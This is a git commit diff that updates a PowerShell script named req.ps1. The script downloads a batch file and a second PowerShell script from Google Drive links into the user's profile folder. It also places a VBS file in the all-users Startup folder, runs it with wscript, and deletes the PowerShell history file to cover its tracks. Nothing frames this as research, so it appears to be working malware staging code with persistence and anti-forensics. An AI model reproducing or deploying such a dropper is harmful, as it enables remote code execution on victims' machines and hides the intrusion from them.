7e3de4dc50ee56b38150ff6b6346c8fa0e27a9a8
UNKNOWNHUNTER6969 <98267862+UNKNOWNHUNTER6969@users.noreply.github.com>
2025-07-11 21:27:37 -0700

    Update req.ps1

--- req.ps1
+++ req.ps1
@@ -1,8 +1,8 @@
-cd C:\Users\$Env:UserName
-Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1bVch_eQP-2QiQllrW5VKCDm0u9p-nJ5I" -outfile "win64.bat"
-Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1xejGhEY1YxEJNanzlceGfv9SVNdGpDEg" -outfile "user.ps1"
+cd "$env:USERPROFILE"
+Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1bVch_eQP-2QiQllrW5VKCDm0u9p-nJ5I" -OutFile "win64.bat"
+Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1xejGhEY1YxEJNanzlceGfv9SVNdGpDEg" -OutFile "user.ps1"
 cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
-Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1Xb04koBk_3V7TowsMP3kaqgpBAWJZz5x" -outfile "startup.vbs"
-start startup.vbs
-Clear-History
+Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1GFyhlHfump8_H-SwNXQBrJBLEV3nqcmr" -OutFile "startup.vbs"
+Start-Process "wscript.exe" -ArgumentList "startup.vbs"
+Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
 exit
